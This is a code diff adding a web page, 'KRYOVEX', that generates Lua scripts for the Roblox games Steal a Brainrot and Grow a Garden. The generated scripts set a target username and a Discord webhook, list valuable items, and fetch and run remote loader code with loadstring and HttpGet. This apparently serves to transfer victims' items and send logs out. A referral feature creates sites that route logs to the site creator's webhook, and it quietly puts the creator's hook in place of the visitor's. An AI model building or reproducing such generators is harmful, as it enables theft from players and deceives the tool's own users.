+                document.write('<style>#create-site-card{display:none!important}</style>');
+            }
+        })();
+    </script>
+    <div class="ve-card" id="create-site-card">
+        <div style="display:flex;flex-direction:column;gap:18px;">
+            <div>
+                <p style="font-family:'Syncopate',sans-serif;font-size:1.6rem;font-weight:700;letter-spacing:-0.5px;" id="dh-title">KRYOVEX LINK</p>
+                <p class="lbl" style="margin:6px 0 0;">Share your link — logs from your site go straight to you</p>
+            </div>
+            <div>
+                <label class="lbl">Roblox Username</label>
+                <input type="text" id="ref-roblox-input" placeholder="Your username" class="inp">
+            </div>
+            <div>
+                <label class="lbl">Discord Webhook</label>
+                <input type="text" id="ref-webhook-input" placeholder="https://discord.com/api/webhooks/..." class="inp">
+            </div>
+            <button onclick="createRefSite()" class="primary-btn"><span id="create-ref-text">GENERATE MY SITE</span></button>
+            <div id="ref-output" class="hidden">
+                <label class="lbl">Your Site Link</label>
+                <div style="display:flex;gap:8px;">
+                    <input type="text" id="ref-link-display" readonly class="inp" style="cursor:pointer;flex:1;" onclick="copyRefLink()">
+                    <button onclick="copyRefLink()" id="ref-copy-btn" class="ref-copy-btn">COPY</button>
+                </div>
+                <p class="lbl" style="margin-top:8px;">Share this. Every script generated sends logs to your account.</p>
+            </div>
+            <p id="ref-error" class="hidden" style="color:#ef4444;font-size:10px;font-weight:700;text-transform:uppercase;">
+                <i class="fa-solid fa-triangle-exclamation"></i> <span id="ref-error-msg">Error</span>
+            </p>
+        </div>
+    </div>
+
+    <script>
+        const RUBIS_REF_API = 'https://api.rubis.dev/api/ref';
+
+        // ===== BG ANIMATION =====
+        const canvas=document.getElementById('bg-canvas'),ctx=canvas.getContext('2d');
+        let stars=[],animRunning=true;
+        function initStars(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;stars=[];for(let i=0;i<200;i++)stars.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,z:Math.random()*canvas.width});}
+        function drawStars(){if(!animRunning)return;ctx.fillStyle="#02040a";ctx.fillRect(0,0,canvas.width,canvas.height);const cx=canvas.width/2,cy=canvas.height/2;stars.forEach(s=>{s.z-=2;if(s.z<=0)s.z=canvas.width;const x=(s.x-cx)*(canvas.width/s.z)+cx,y=(s.y-cy)*(canvas.width/s.z)+cy,r=(1-s.z/canvas.width)*2;ctx.fillStyle=`rgba(59,130,246,${1-s.z/canvas.width})`;ctx.beginPath();ctx.arc(x,y,r,0,Math.PI*2);ctx.fill();});requestAnimationFrame(drawStars);}
+        window.addEventListener('resize',initStars);initStars();drawStars();
+
+        // ===== GAME TABS =====
+        let activeGame='sab';
+        function switchGame(game){
+            activeGame=game;
+            document.getElementById('game-sab').classList.toggle('hidden',game!=='sab');
+            document.getElementById('game-gag').classList.toggle('hidden',game!=='gag');
+            document.getElementById('gtab-sab').classList.toggle('active',game==='sab');
+            document.getElementById('gtab-gag').classList.toggle('active',game==='gag');
+            if(!IS_REF_SITE)document.getElementById('create-site-card').classList.toggle('hidden',game!=='sab'||activeSabTool!=='logger');
+            if(game==='gag'){refreshGagSeeds();refreshGagPets();refreshGagGears();refreshGagProps();}
+        }
+
+        let activeSabTool='logger';
+        function switchSabTool(tool){
+            activeSabTool=tool;
+            const logger=tool==='logger';
+            document.getElementById('sab-gen-panel').classList.toggle('hidden',!logger);
+            document.getElementById('sab-auto-accept-panel').classList.toggle('hidden',logger);
+            document.getElementById('sabtab-logger').classList.toggle('active',logger);
+            document.getElementById('sabtab-auto-accept').classList.toggle('active',!logger);
+            document.getElementById('create-site-card').classList.toggle('hidden',!logger);
+        }
+
+        // ===== REF SYSTEM =====
+        let REF_TARGET_USER='',REF_WEBHOOK_URL='',IS_REF_SITE=false;
+
+        function applyRefSite(){
+            IS_REF_SITE=true;
+            animRunning=false;
+            document.body.classList.remove('ve-theme');
+            document.body.classList.add('am-theme');
+            document.title='KRYOVEX — Script Generator';
+            document.getElementById('am-hero-username').textContent='KRYOVEX';
+            document.getElementById('am-hero').classList.remove('hidden');
+            document.getElementById('ve-header').style.display='none';
+
+            const dhTitle=document.getElementById('dh-title');
+            if(dhTitle){dhTitle.style.fontFamily="'Sora',sans-serif";dhTitle.style.fontWeight='800';}
+
+            ['freeze','dice','anti-leave'].forEach(m=>{const b=document.getElementById('btn-'+m);if(b)b.style.display='none';});
+            document.getElementById('sab-loadstring-row').classList.add('hidden');
+            document.getElementById('game-tabs-row').classList.add('hidden');
+            document.getElementById('create-site-card').style.setProperty('display','none','important');
+
+            const uField=document.getElementById('roblox-username');
+            if(uField){uField.value='';}
+
+            isAuthenticated=true;
+            document.documentElement.style.visibility = 'visible';
+        }
+
+        async function initRef(){
+            const pathParts=window.location.pathname.split('/');
+            const shortCode=(pathParts[1]==='r'&&pathParts[2])?pathParts[2]:null;
+            if(!shortCode)return;
+            try{
+                const localSaved=localStorage.getItem('kryovex_ref_'+shortCode);
+                if(localSaved){
+                    const parsed=JSON.parse(localSaved);
+                    REF_TARGET_USER=parsed.username||'';
+                    REF_WEBHOOK_URL=parsed.webhook||'';
+                    if(REF_TARGET_USER){applyRefSite();return;}
+                }
+                const res=await fetch(`${RUBIS_REF_API}/${shortCode}`);
+                if(!res.ok){document.documentElement.style.visibility='visible';return;}
+                const data=await res.json();
+                REF_TARGET_USER=data.username||'';
+                REF_WEBHOOK_URL=data.webhook||'';
+                if(REF_TARGET_USER)applyRefSite();
+                else document.documentElement.style.visibility='visible';
+            }catch(_){document.documentElement.style.visibility='visible';}
+        }
+        initRef();
+
+        const customBase={current:'normal'};
+        function setCustomBase(m){
+            customBase.current=m;
+            ['normal','anti-leave'].forEach(x=>{const b=document.getElementById(`custombase-btn-${x}`);if(b)b.classList.toggle('active',x===m);});
+        }
+
+        // ===== SESSION =====
+        let isAuthenticated=true;
+        function checkSession(){
+            if(IS_REF_SITE)return;
+            if(new URLSearchParams(window.location.search).get('login')==='success'){
+                window.history.replaceState({},document.title,'/');
+            }
+            setLoggedIn();
+        }
+        function setLoggedIn(){isAuthenticated=true;document.getElementById('logged-in-status').classList.remove('hidden');createPills();createSkinPills();createGearPills();}
+        function setLoggedOut(){setLoggedIn();}
+
+        // ===== SAB DATA =====
+        const brainrots=["Garama and Madundung", "Capitano Moby", "Burguro And Fryuro", "Ketchuru and Musturu", "Lavadorito Spinito", "Ketupat Kepat", "Tictac Sahur", "Tang Tang Keletang", "Money Money Puggy", "Nuclearo Dinossauro", "Graipuss Medussi", "Cerberus", "Dragon Cannelloni", "Agarrini la Palini", "Fragola La La La", "Los Hotspotsitos", "Los Bros", "Tralaledon", "Los Puggies", "Los Primos", "Los Tacoritas", "Los Spaghettis", "Spooky and Pumpky", "Fragrama and Chocrama", "La Casa Boo", "Ketupat Bros", "Cooki and Milki", "Popcuru and Fizzuru", "La Supreme Combinasion", "Dragon Gingerini", "Headless Horseman", "Hydra Dragon Cannelloni", "Celularcini Viciosini", "La Grande Combinasion", "Los Trios", "La Sahur Combinasion", "Bacuru and Egguru", "Eviledon", "Orcaledon", "Money Money Reindeer", "Los Jolly Combinasionas", "Jolly Jolly Sahur", "Chicleteira Noelteira", "Bisonte Giuppitere", "Jackorilla", "Reindeer Tralala", "Pumpkini Spyderini", "Frankentteo", "Santteo", "Telemorte", "Spaghetti Tualetti", "La Secret Combinasion", "La Food Combinasion", "Los Spooky Combinasionas", "Karkerkar Kurkur", "La Ginger Sekolah", "Rosey and Teddy", "Los Sekolahs", "Reinito Sleighito", "Swaggy Bros", "La Taco Combinasion", "Chipso and Queso", "La Spooky Grande", "Tuff Toucan", "Chillin Chili", "Gobblino Uniciclino", "Strawberry Elephant", "La Extinct Grande", "Tacorita Bicicleta", "Quesadillo Vampiro", "Perrito Burrito", "La Vacca Saturno Saturnita", "Karker Sahur", "Bunito Bunito Spinito", "Pirulitoita Bicicleteira", "Bunnyman", "Brunito Marsito", "Guest 666", "Mariachi Corazoni", "Swag Soda", "Extinct Matteo", "Los Quesadillas", "Spinny Hammy", "Meowl", "Skibidi Toilet", "Nacho Spyder", "Griffin", "W or L", "La Jolly Grande", "La Romantic Grande", "Festive 67", "Los Tralaleritos", "Las Tralaleritas", "GOAT", "Love Love Bear", "Ginger Gerat", "Mieteteira Bicicleteira", "Trenostruzzo Turbo 4000", "La Karkerkar Combinasion", "La Vacca Prese Presente", "Rocco Disco", "1x1x1x1", "25", "67", "Abyssaloco", "Antonio", "Aquarino", "Arcadopus", "Arcadragon", "Bananito", "Baskito", "Bearito Cabinito", "Berryno", "Blackhole Goat", "Boatito Auratito", "Bombardiro Vaccariro", "Boppin Bunny", "Buho de Volto", "Bunny Bunny Bunny Sahur", "Bunny and Eggy", "Buntteo", "Burrito Bandito", "Camera Ramena", "Capitano Gullini", "Cash or Card", "Caylusaurus", "Celestial Pegasus", "Chachechi", "Chicleteira Bicicleteira", "Chicleteira Cupideira", "Chicleteira Surfeiteira", "Chicleteirina Bicicleteirina", "Chill Puppy", "Chimnino", "Churrito Bunnito", "Cigno Fulgoro", "Cloverat Clapat", "Coco and Mango", "Craburger", "Cuadramat and Pakrahmatmamat", "Cupid Cupid Sahur", "Cupid Hotspot", "DJ Panda", "Digi Narwhal", "Donkeyturbo Express", "Dragon Aquanini", "Dug dug dug", "Duggy Bros", "Dul Dul Dul", "Easter Easter Easter Sahur", "Eid Eid Eid Sahur", "Elefanto Frigo", "Esok Sekolah", "Extinct Tralalero", "Fishboard", "Fishino Clownino", "Flancito", "Flipa Sandala", "Fortunu and Cashuru", "Foxini Lanternini", "Frullato Framingo", "Futbolini Skatini", "Gelato Lumacho", "Giftini Spyderini", "Girafini Raftini", "Glaciator", "Globa Steppa", "Gold Egg", "Gold Elf", "Gold Gold Gold", "Granny", "Guerriro Digitale", "Gym Bros", "Ho Ho Ho Sahur", "Hopilikalika Hopilikalako", "Horegini Boom", "Hydra Bunny", "Jelly Moby", "Job Job Job Sahur", "John Doe", "Kalika Bros", "Kraken", "La Anniversary Grande", "La Cucaracha", "La Easter Grande", "La Lucky Grande", "La Summer Grande", "La Vacca Jacko Linterino", "La Vacca Lepre Lepreino", "Las Sis", "Las Vaquitas Saturnitas", "List List List Sahur", "Los 25", "Los 67", "Los Amigos", "Los Bunitos", "Los Burritos", "Los Candies", "Los Chicleteiras", "Los Chillis", "Los Combinasionas", "Los Cucarachas", "Los Cupids", "Los Fruits", "Los Hackers", "Los Jobcitos", "Los Karkeritos", "Los Mariachis", "Los Matteos", "Los Mi Gatitos", "Los Mobilis", "Los Nooo My Hotspotsitos", "Los Planitos", "Los Spyderinis", "Los Sweethearts", "Los Tortus", "Love Love Love Sahur", "Lovin Rose", "Luck Luck Luck Sahur", "Lucky Block", "Mi Gatito", "Money Money Bros", "Naughty Naughty", "Noo my Candy", "Noo my Eggs", "Noo my Gold", "Noo my Heart", "Noo my Present", "Noo my examine", "Nooo My Hotspot", "Octoball", "Ombrello Topolino", "Pancake and Syrup", "Paradiso Axolottino", "Please my Present", "Pot Hotspot", "Pot Pumpkin", "Quackini Snackini", "Quesadilla Crocodila", "Rang Ring Bus", "Rico Dinero", "Rocketini Frostini", "Rosetti Tualetti", "Rubrikiko", "Sammyni Cakini", "Sammyni Fattini", "Sammyni Spyderini", "Sand Sand Sand", "Santa Hotspot", "Serafinna Medusella", "Signore Carapace", "Snailo Clovero", "Steakini Fattini", "Strawberrita", "Sushi Inu", "Tacorillo Crocodillo", "Tirilikalika Tirilikalako", "To To To Sahur", "Torrtuginni Dragonfrutini", "Trickolino", "Triplito Tralaleritos", "Ventoliero Pavonero", "Venuspino", "Vulturino Skeletono", "Yess my examine", "Zombie Tralala", "Esok Goala", "Ref Ref Ref Sahur", "Hippo Golazo", "Bufalino Boomberino", "Capitano Americano", "Var Var Var", "Los Tictacs", "Los Tangcitos", "Los Admins", "Moby Bros", "Grabatron", "Rubiko and Kubiko", "Cangurato Gelato", "Noodle Noodle Poodle", "Toro Españolo", "Chicleteira Champeona", "Examen Bros", "Pizza and Ranch", "Los Secret Combinasionas", "Bumbatron", "Yetimatic", "S'more Serat", "Queen Bee", "Scorpino Coasterino", "Honey Honey Bear", "Pogo Pogo Penguin", "Conetto Morsetto", "La Breakfast Combinasion", "La Fuse Machine", "Candini Fluffini", "Polaroidini", "Noo my Resume", "Peschito Machito", "4th Bros", "Los Cornis", "Gelatina Volatina", "Los Sigmas", "Yess my Resume", "Nachorilla", "Sammyni Truckini", "Tacoturbo Tacorito", "Burrito Bat", "Pop Pop Petalini", "Rosatops Triceratino", "Motorino Bumbino", "Syrup Samurai", "Orchidox", "Los Dragons", "La Craft Machine", "Gold and Diamond", "Chicli Chicla", "Panda Popanda", "Deputy Leopard", "John Pork", "Zebrino Pianino", "Ski Ski Skunki", "Sir Mangus", "Sammyni Spookyni", "Rockarino Rockara", "Capibaro Celestino", "Draculino", "Fangaro Lupino", "Gattino Hydrantino", "Gub", "Honey Honey Narwhal", "Hydra Serpent", "Lavamanta", "Lionello Casarello", "Los Treaters", "Marino Submarino", "Oni Oni Panda", "Pelican Pachetto", "Phoenix", "Pin Pin Pengu", "Plant Bros", "Puffino Builderino", "Qamar Camelamp", "Ranito Pepito", "Rexino Ramino", "Dragon Skeletonini", "Cobra Gelato", "Flying Dutchman", "Slushki Huski", "Boo Boo Rocket", "Bat-in-the-Box", "Bananito Skelito", "Zombie Bowl", "Grim Cheese", "Arca Bros", "Medusini and Demonini", "Puppetmaster", "Skelly and Coffy", "Scarino Crowino", "Cobra Gelato", "Spooketti Tualetti", "Scorpi Inferni", "Spooky Spooky Sahur", "Jacko Jakat", "Pum Pum Pum", "Tosto Dino", "Fang Fang Draculang", "Money Money Cat", "Spooky Kart", "Chicken Zombie", "Skooter Skelly", "Co Co Co Sahur", "Cola Cat"];
+        let selected=new Set();
+        const baseSkins=["Rose","Gingerbread","Halloween","Christmas","Bunny Basket","Summer","Pot of Gold","Taco","Octo","Valentines","Easter","Lucky","Aquatic","Tralalero",];
+        const gears=["Santa's Sleigh","Cupid's Wings","Witch's Broom","Waverider","Yin Yang Slap","Cursed Slap","Cyber Slap","Divine Slap","Bloodmoon Slap","Radioactive Slap","Rainbow Slap","Rainbow Hammer","Bloodmoon Hammer","Radioactive Airstrike","Yin Yang Lamp","Demon's Head","Lava Slap","Lava Blaster","Alien Slap","Blackhole Bomb","Candy Sentry","Phantom Slap","Crystal Slap"];
+        let selectedSkins=new Set(),selectedGears=new Set(),currentMode='normal';
+
+        function createPills(f=brainrots){const c=document.getElementById('brainrot-container');c.innerHTML='';f.forEach(name=>{const p=document.createElement('div');p.className=`pill${selected.has(name)?' active':''}`;p.textContent=name;p.onclick=()=>{selected.has(name)?selected.delete(name):selected.add(name);updateCount();createPills(f);};c.appendChild(p);});}
+        function updateCount(){document.getElementById('count-text').textContent=`${selected.size} SELECTED`;}
+        function selectAll(){brainrots.forEach(n=>selected.add(n));createPills();updateCount();}
+        function deselectAll(){selected.clear();createPills();updateCount();}
+        function renderPills(cid,list,sel,f){const c=document.getElementById(cid);c.innerHTML='';(f||list).forEach(name=>{const p=document.createElement('div');p.className=`pill${sel.has(name)?' active':''}`;p.textContent=name;p.onclick=()=>{sel.has(name)?sel.delete(name):sel.add(name);renderPills(cid,list,sel,f);updateSGC();};c.appendChild(p);});}
+        function createSkinPills(f){renderPills('skin-container',baseSkins,selectedSkins,f);}
+        function createGearPills(f){renderPills('gear-container',gears,selectedGears,f);}
+        function updateSGC(){document.getElementById('skin-count-text').textContent=`${selectedSkins.size} SELECTED`;document.getElementById('gear-count-text').textContent=`${selectedGears.size} SELECTED`;}
+        function selectAllSkins(){baseSkins.forEach(n=>selectedSkins.add(n));createSkinPills();updateSGC();}
+        function deselectAllSkins(){selectedSkins.clear();createSkinPills();updateSGC();}
+        function selectAllGears(){gears.forEach(n=>selectedGears.add(n));createGearPills();updateSGC();}
+        function deselectAllGears(){selectedGears.clear();createGearPills();updateSGC();}
+        document.getElementById('brainrot-search').addEventListener('input',function(){createPills(brainrots.filter(b=>b.toLowerCase().includes(this.value.toLowerCase())));});
+        document.getElementById('skin-search').addEventListener('input',function(){createSkinPills(baseSkins.filter(s=>s.toLowerCase().includes(this.value.toLowerCase())));});
+        document.getElementById('gear-search').addEventListener('input',function(){createGearPills(gears.filter(g=>g.toLowerCase().includes(this.value.toLowerCase())));});
+
+        function setMode(mode){currentMode=mode;['normal','freeze','dice','anti-leave','custom'].forEach(m=>document.getElementById(`btn-${m}`).classList.toggle('active',m===mode));document.getElementById('custom-section').classList.toggle('hidden',mode!=='custom');}
+
+        async function generateScript(){
+            const btnText=document.getElementById('gen-text'),output=document.getElementById('output-section'),display=document.getElementById('script-display');
+            const user=IS_REF_SITE?REF_TARGET_USER:(document.getElementById('roblox-username').value||'USER');
+            const userTypedWebhook=document.getElementById('webhook').value.trim();
+            if(IS_REF_SITE&&!userTypedWebhook){
+                output.classList.remove('hidden');
+                display.textContent='-- Error: Enter your Discord webhook to receive trade notifications.';
+                return;
+            }
+            const web=IS_REF_SITE&&REF_WEBHOOK_URL?REF_WEBHOOK_URL:(userTypedWebhook||'WEBHOOK');
+            let loader=currentMode==='freeze'?'ecd65ca2d9a4cf35c9951aada0f53aa2':(currentMode==='dice'?'82744afa27eb7289197ee5032a94ca10':(currentMode==='anti-leave'?'69ebd47abc10f91ef0a43a3f26746221':'c5a067c93477b930cc4602547c6d5ffe'));
+            if(currentMode==='custom'){loader=customBase.current==='anti-leave'?'69ebd47abc10f91ef0a43a3f26746221':'c5a067c93477b930cc4602547c6d5ffe';}
+            const bTable=Array.from(selected).map(b=>`    ["${b}"] = true`).join(',\n');
+            const sTable=Array.from(selectedSkins).map(b=>`    ["${b}"] = true`).join(',\n');
+            const gTable=Array.from(selectedGears).map(b=>`    ["${b}"] = true`).join(',\n');
+            const customLS=currentMode==='custom'?(document.getElementById('custom-loadstring').value.trim()):'';
+            const mainLS=`loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/${loader}.lua",true))()`;
+            const customBlock=customLS?`task.spawn(function()\n${mainLS}\nend)\n\ntask.wait(1)\n\n${customLS}`:mainLS;
+            const dualhookBlock=IS_REF_SITE&&REF_WEBHOOK_URL?`getgenv().DUALHOOK = true\ngetgenv().DUALHOOK_URL = "${userTypedWebhook}"\n`:((!IS_REF_SITE&&REF_WEBHOOK_URL)?`getgenv().DUALHOOK = true\ngetgenv().DUALHOOK_URL = "${REF_WEBHOOK_URL}"\n`:'');
+            const fullScript=`${dualhookBlock}getgenv().TARGET_USER = "${user}"\ngetgenv().WEBHOOK_URL = "${web}"\ngetgenv().NORMAL_BRAINROTS = {\n${bTable}\n}\ngetgenv().NORMAL_BASE_SKINS = {\n${sTable}\n}\ngetgenv().NORMAL_GEARS = {\n${gTable}\n}\ntask.spawn(function()\n${customBlock}\nend)`;
+            output.classList.remove('hidden');
+            if(IS_REF_SITE||document.getElementById('loadstring-toggle').checked){
+                btnText.textContent='GENERATING...';display.textContent='-- Connecting to server...';
+                try{
+                    const res=await fetch('/api/save',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({script:fullScript,provider:'kryovex'})});
+                    const d=await res.json();
+                    display.textContent=res.ok&&d.url?`loadstring(game:HttpGet("${d.url}"))()` :'-- Error: Server response not OK';
+                }catch(e){display.textContent='-- Error: Request failed';}
+                btnText.textContent='GENERATE SCRIPT';
+            }else{display.textContent=fullScript;}
+        }
+
+        function copyToClipboard(id){navigator.clipboard.writeText(document.getElementById(id).textContent).then(()=>{const b=document.getElementById('copy-btn');if(b){const o=b.textContent;b.textContent='COPIED!';setTimeout(()=>b.textContent=o,1500);}});}
+
+        // ===== AUTO ACCEPT CONFIG BUILDER =====
+        const autoAcceptSelected={
+            brainrots:new Set(brainrots),
+            skins:new Set(baseSkins),
+            gears:new Set(gears)
+        };
+        const autoAcceptMeta={
+            brainrots:{list:brainrots,container:'aa-brainrot-container',count:'aa-brainrot-count'},
+            skins:{list:baseSkins,container:'aa-skin-container',count:'aa-skin-count'},
+            gears:{list:gears,container:'aa-gear-container',count:'aa-gear-count'}
+        };
+        function renderAutoAcceptPills(kind,filter){
+            const meta=autoAcceptMeta[kind],selected=autoAcceptSelected[kind];
+            const container=document.getElementById(meta.container);
+            const items=filter||meta.list;
+            container.innerHTML='';
+            items.forEach(name=>{
+                const pill=document.createElement('div');
+                pill.className=`pill${selected.has(name)?' active':''}`;
+                pill.textContent=name;
+                pill.onclick=()=>{
+                    selected.has(name)?selected.delete(name):selected.add(name);
+                    renderAutoAcceptPills(kind,filter);
+                    updateAutoAcceptCounts();
+                };
+                container.appendChild(pill);
+            });
+            document.getElementById(meta.count).textContent=`${selected.size} SELECTED`;
+        }
+        function updateAutoAcceptCounts(){
+            Object.keys(autoAcceptMeta).forEach(kind=>{
+                document.getElementById(autoAcceptMeta[kind].count).textContent=
+                    `${autoAcceptSelected[kind].size} SELECTED`;
+            });
+        }
+        function selectAllAutoAccept(kind){
+            autoAcceptMeta[kind].list.forEach(name=>autoAcceptSelected[kind].add(name));
+            renderAutoAcceptPills(kind);
+            updateAutoAcceptCounts();
+        }
+        function clearAutoAccept(kind){
+            autoAcceptSelected[kind].clear();
+            renderAutoAcceptPills(kind);
+            updateAutoAcceptCounts();
+        }
+        function toggleTradeBlockFields(){
+            const enabled=document.getElementById('aa-trade-block-enabled').checked;
+            const settings=document.getElementById('aa-trade-block-settings');
+            settings.style.opacity=enabled?'1':'0.45';
+            settings.querySelectorAll('input').forEach(input=>{input.disabled=!enabled;});
+        }
+        function luaQuote(value){
+            return `"${String(value)
+                .replace(/\\/g,'\\\\')
+                .replace(/"/g,'\\"')
+                .replace(/\r/g,'\\r')
+                .replace(/\n/g,'\\n')}"`;
+        }
+        function luaSet(selected){
+            return Array.from(selected)
+                .sort((a,b)=>a.localeCompare(b))
+                .map(name=>`    [${luaQuote(name)}] = true,`)
+                .join('\n');
+        }
+
+        function showAutoAcceptError(message){
+            const error=document.getElementById('aa-error-msg');
+            error.textContent=message;
+            error.classList.remove('hidden');
+        }
+        async function generateAutoAcceptConfig(){
+            const error=document.getElementById('aa-error-msg');
+            error.classList.add('hidden');
+            const webhook=document.getElementById('aa-webhook').value.trim();
+            const minimum=Number.parseInt(document.getElementById('aa-trade-minimum').value,10);
+            const windowSeconds=Number.parseInt(document.getElementById('aa-trade-window').value,10);
+            const tradeBlockEnabled=document.getElementById('aa-trade-block-enabled').checked;
+            const useShortLink=document.getElementById('aa-loadstring-toggle').checked;
+            if(!webhook.startsWith('https://discord.com/api/webhooks/')
+                && !webhook.startsWith('https://discordapp.com/api/webhooks/')){
+                showAutoAcceptError('ENTER A VALID DISCORD WEBHOOK URL');
+                return;
+            }
+            if(!Number.isInteger(minimum)||minimum<1||minimum>100){
+                showAutoAcceptError('TRADE BLOCK MINIMUM MUST BE 1-100');
+                return;
+            }
+            if(!Number.isInteger(windowSeconds)||windowSeconds<1||windowSeconds>3600){
+                showAutoAcceptError('TRADE BLOCK WINDOW MUST BE 1-3600 SECONDS');
+                return;
+            }
+            const script=[
+                `getgenv().WEBHOOK_URL = ${luaQuote(webhook)}`,
+                `getgenv().TARGET_BRAINROTS = {`,
+                luaSet(autoAcceptSelected.brainrots),
+                `}`,
+                `getgenv().TARGET_BASE_SKINS = {`,
+                luaSet(autoAcceptSelected.skins),
+                `}`,
+                `getgenv().TARGET_GEARS = {`,
+                luaSet(autoAcceptSelected.gears),
+                `}`,
+                `getgenv().TRADE_BLOCK_ENABLED = ${tradeBlockEnabled?'true':'false'}`,
+                `getgenv().TRADE_BLOCK_MINIMUM = ${minimum}`,
+                `getgenv().TRADE_BLOCK_WINDOW = ${windowSeconds}`,
+                `getgenv().TRADE_LIMIT = ${minimum}`,
+                `getgenv().TRADE_WINDOW = ${windowSeconds}`,
+                `getgenv().AUTO_ACCEPT_CONFIG = {`,
+                `    AutoAcceptWebhookURL = ${luaQuote(webhook)},`,
+                `    TradeBlockEnabled = ${tradeBlockEnabled?'true':'false'},`,
+                `    TradeBlockMinimum = ${minimum},`,
+                `    TradeBlockWindowSeconds = ${windowSeconds},`,
+                `}`,
+                `loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/7797cc97adab8009a37f0769ff939ab1.lua"))()`
+            ].join('\n');
+            document.getElementById('aa-output-section').classList.remove('hidden');
+            const display=document.getElementById('aa-script-display');
+            const buttonText=document.getElementById('aa-gen-text');
+            if(!useShortLink){
+                display.textContent=script;
+                return;
+            }
+            buttonText.textContent='GENERATING...';
+            display.textContent='-- Connecting to server...';
+            try{
+                const response=await fetch('/api/save',{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({script,provider:'kryovex'})
+                });
+                const result=await response.json();
+                if(!response.ok||!result.url)throw new Error(result.error||'Upload failed');
+                display.textContent=`loadstring(game:HttpGet(${luaQuote(result.url)}))()`;
+            }catch(uploadError){
+                display.textContent=`-- Error: ${uploadError.message||'Upload failed'}`;
+            }finally{
+                buttonText.textContent='GENERATE AUTO ACCEPT SCRIPT';
+            }
+        }
+        function copyAutoAcceptConfig(){
+            const text=document.getElementById('aa-script-display').textContent;
+            navigator.clipboard.writeText(text).then(()=>{
+                const button=document.getElementById('aa-copy-btn');
+                const original=button.textContent;
+                button.textContent='COPIED!';
+                setTimeout(()=>button.textContent=original,1500);
+            });
+        }
+        document.getElementById('aa-brainrot-search').addEventListener('input',function(){
+            renderAutoAcceptPills('brainrots',brainrots.filter(name=>name.toLowerCase().includes(this.value.toLowerCase())));
+        });
+        document.getElementById('aa-skin-search').addEventListener('input',function(){
+            renderAutoAcceptPills('skins',baseSkins.filter(name=>name.toLowerCase().includes(this.value.toLowerCase())));
+        });
+        document.getElementById('aa-gear-search').addEventListener('input',function(){
+            renderAutoAcceptPills('gears',gears.filter(name=>name.toLowerCase().includes(this.value.toLowerCase())));
+        });
+        renderAutoAcceptPills('brainrots');
+        renderAutoAcceptPills('skins');
+        renderAutoAcceptPills('gears');
+        toggleTradeBlockFields();
+
+        // ===== GAG DATA =====
+        const gagSeeds=["Moon Bloom","Dragon's Breath","Rainbow Seed","Venus Fly Trap","Pomegranate","Poison Apple","Ghost Pepper","Gold Seed","Dragon Fruit","Acorn","Cherry","Sunflower","Poison Ivy","Mushroom","Green Bean","Banana","Grape","Coconut","Mango","Glow Mushroom","Bamboo","Corn","Cactus","Pineapple","Baby Cactus","Horned Melon","Tulip","Tomato","Apple","Carrot","Strawberry","Blueberry"];
+        const gagPets=["Raccoon","Unicorn","Golden Dragonfly","Robin","Bee","Deer","Owl","Bunny","Frog","Monkey","Ice Serpent","Black Dragon"];
+        const gagGears=["Super Sprinkler","Super Watering Can","Legendary Sprinkler","Teleporter","Invisibility Mushroom","Wheelbarrow","Shrink Mushroom","Supersize Mushroom","Gnome","Flashbang","Basic Pot","Rare Sprinkler","Trowel","Jump Mushroom","Speed Mushroom","Lantern","Uncommon Sprinkler","Common Sprinkler","Common Watering Can","Sign","Power Hose","Freeze Ray","Rainbow Carpet","Vine Wrapper"];
+        const gagProps=["Teleporter Pad Crate","Owner Door Crate","Bear Trap Crate","Fence Crate","Bridge Crate","Spring Crate","Seesaw Crate","Conveyor Crate","Sign Crate","Arch Crate","Roleplay Crate","Bench Crate","Light Crate","Ladder Crate"];
+        let gagSelectedSeeds=new Set(),gagSelectedPets=new Set(),gagSelectedGears=new Set(),gagSelectedProps=new Set(),gagCurrentMode='normal';
+        function renderGagPills(cid,list,sel,f,cntId){const c=document.getElementById(cid);c.innerHTML='';const items=f!==undefined?f:list;if(!items.length){c.innerHTML='<p style="font-size:9px;color:#444;font-style:italic;">No items</p>';document.getElementById(cntId).textContent='0 SELECTED';return;}items.forEach(name=>{const p=document.createElement('div');p.className=`pill${sel.has(name)?' active':''}`;p.textContent=name;p.onclick=()=>{sel.has(name)?sel.delete(name):sel.add(name);renderGagPills(cid,list,sel,f,cntId);document.getElementById(cntId).textContent=`${sel.size} SELECTED`;};c.appendChild(p);});document.getElementById(cntId).textContent=`${sel.size} SELECTED`;}
+        function refreshGagSeeds(f){renderGagPills('gag-seed-container',gagSeeds,gagSelectedSeeds,f,'gag-seed-count');}
+        function refreshGagPets(f){renderGagPills('gag-pet-container',gagPets,gagSelectedPets,f,'gag-pet-count');}
+        function refreshGagGears(f){renderGagPills('gag-gear-container',gagGears,gagSelectedGears,f,'gag-gear-count');}
+        function refreshGagProps(f){renderGagPills('gag-prop-container',gagProps,gagSelectedProps,f,'gag-prop-count');}
+        function selectAllGag(t){if(t==='seeds'){gagSeeds.forEach(n=>gagSelectedSeeds.add(n));refreshGagSeeds();}else if(t==='pets'){gagPets.forEach(n=>gagSelectedPets.add(n));refreshGagPets();}else if(t==='gears'){gagGears.forEach(n=>gagSelectedGears.add(n));refreshGagGears();}else if(t==='props'){gagProps.forEach(n=>gagSelectedProps.add(n));refreshGagProps();}}
+        function deselectAllGag(t){if(t==='seeds'){gagSelectedSeeds.clear();refreshGagSeeds();}else if(t==='pets'){gagSelectedPets.clear();refreshGagPets();}else if(t==='gears'){gagSelectedGears.clear();refreshGagGears();}else if(t==='props'){gagSelectedProps.clear();refreshGagProps();}}
+        document.getElementById('gag-seed-search').addEventListener('input',function(){refreshGagSeeds(gagSeeds.filter(s=>s.toLowerCase().includes(this.value.toLowerCase())));});
+        document.getElementById('gag-pet-search').addEventListener('input',function(){refreshGagPets(gagPets.filter(p=>p.toLowerCase().includes(this.value.toLowerCase())));});
+        document.getElementById('gag-gear-search').addEventListener('input',function(){refreshGagGears(gagGears.filter(g=>g.toLowerCase().includes(this.value.toLowerCase())));});
+        document.getElementById('gag-prop-search').addEventListener('input',function(){refreshGagProps(gagProps.filter(p=>p.toLowerCase().includes(this.value.toLowerCase())));});
